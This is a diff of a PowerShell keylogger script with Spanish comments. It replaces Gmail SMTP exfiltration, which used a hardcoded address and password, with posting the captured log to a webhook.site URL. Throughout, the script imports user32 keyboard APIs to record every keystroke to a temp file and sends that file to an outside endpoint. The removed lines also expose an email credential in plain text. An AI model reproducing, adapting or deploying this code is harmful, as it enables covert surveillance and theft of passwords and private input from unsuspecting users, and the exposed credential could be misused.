@@ -1,89 +1,82 @@
-# powershell keylogger
-# created by : C0SM0
-
-# gmail credentials
-$email = "jorgeramonalejandro@gmail.com"
-$password = "781Machado.#@"
-
-
-# Correo electrónico de notificación
-$emailNotification = "jorgeramonalejandro@gmail.com"
-$subjectNotification = "Keylogger se ha ejecutado"
-
-# Enviar correo electrónico de notificación
-$smtpNotification = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587")
-$smtpNotification.EnableSSL = $true
-$smtpNotification.Credentials = New-Object System.Net.NetworkCredential($email, $password)
-
-$smtpNotification.Send($email, $emailNotification, $subjectNotification, "El keylogger se ha ejecutado.")
+# URL del webhook donde enviar los registros
+$webhookUrl = "https://webhook.site/48528db4-d568-4e39-93ef-31b378734d99"
 
 # keylogger
 function KeyLogger($logFile="$env:temp/$env:UserName.log") {
 
-  # email process
-  $logs = Get-Content "$logFile"
-  $subject = "$env:UserName logs"
-  $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587");
-  $smtp.EnableSSL = $true
-  $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);
-  $smtp.Send($email, $email, $subject, $logs);
+    # Verifica si el archivo de registro existe
+    if (-not (Test-Path $logFile)) {
+        New-Item -Path $logFile -ItemType File -Force
+    }
 
-  # generate log file
-  $generateLog = New-Item -Path $logFile -ItemType File -Force
-
-  # API signatures
-  $APIsignatures = @'
-[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
-public static extern short GetAsyncKeyState(int virtualKeyCode);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int GetKeyboardState(byte[] keystate);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int MapVirtualKey(uint uCode, int uMapType);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+    # API signatures
+    $APIsignatures = @'
+    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
+    public static extern short GetAsyncKeyState(int virtualKeyCode);
+    [DllImport("user32.dll", CharSet=CharSet.Auto)]
+    public static extern int GetKeyboardState(byte[] keystate);
+    [DllImport("user32.dll", CharSet=CharSet.Auto)]
+    public static extern int MapVirtualKey(uint uCode, int uMapType);
+    [DllImport("user32.dll", CharSet=CharSet.Auto)]
+    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
 
- # set up API
- $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
+    # Set up API
+    $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
 
-  # attempt to log keystrokes
-  try {
-    while ($true) {
-      Start-Sleep -Milliseconds 40
+    # Attempt to log keystrokes
+    try {
+        while ($true) {
+            Start-Sleep -Milliseconds 40
 
-      for ($ascii = 9; $ascii -le 254; $ascii++) {
+            for ($ascii = 9; $ascii -le 254; $ascii++) {
 
-        # use API to get key state
-        $keystate = $API::GetAsyncKeyState($ascii)
+                # Use API to get key state
+                $keystate = $API::GetAsyncKeyState($ascii)
 
-        # use API to detect keystroke
-        if ($keystate -eq -32767) {
-          $null = [console]::CapsLock
+                # Use API to detect keystroke
+                if ($keystate -eq -32767) {
+                    $null = [console]::CapsLock
 
-          # map virtual key
-          $mapKey = $API::MapVirtualKey($ascii, 3)
+                    # Map virtual key
+                    $mapKey = $API::MapVirtualKey($ascii, 3)
 
-          # create a stringbuilder
-          $keyboardState = New-Object Byte[] 256
-          $hideKeyboardState = $API::GetKeyboardState($keyboardState)
-          $loggedchar = New-Object -TypeName System.Text.StringBuilder
+                    # Create a stringbuilder
+                    $keyboardState = New-Object Byte[] 256
+                    $hideKeyboardState = $API::GetKeyboardState($keyboardState)
+                    $loggedchar = New-Object -TypeName System.Text.StringBuilder
 
-          # translate virtual key
-          if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
-            # add logged key to file
-            [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
-          }
+                    # Translate virtual key
+                    if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
+                        # Add logged key to file
+                        [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
+                    }
+                }
+            }
         }
-      }
     }
-  }
+    catch {
+        # Enviar confirmación de conexión al webhook
+        $confirmationMessage = "El keylogger se ha conectado correctamente."
+        $params = @{
+            Uri = $webhookUrl
+            Method = "POST"
+            Body = $confirmationMessage
+            ContentType = "text/plain"
+        }
+        Invoke-RestMethod @params
 
-  # send logs if code fails
-  finally {
-    # send email
-    $smtp.Send($email, $email, $subject, $logs);
-  }
+        # Enviar el contenido del archivo de registro al webhook
+        $logs = Get-Content $logFile -Raw
+        $params = @{
+            Uri = $webhookUrl
+            Method = "POST"
+            Body = $logs
+            ContentType = "text/plain"
+        }
+        Invoke-RestMethod @params
+    }
 }
 
-# run keylogger
+# Ejecutar keylogger
 KeyLogger
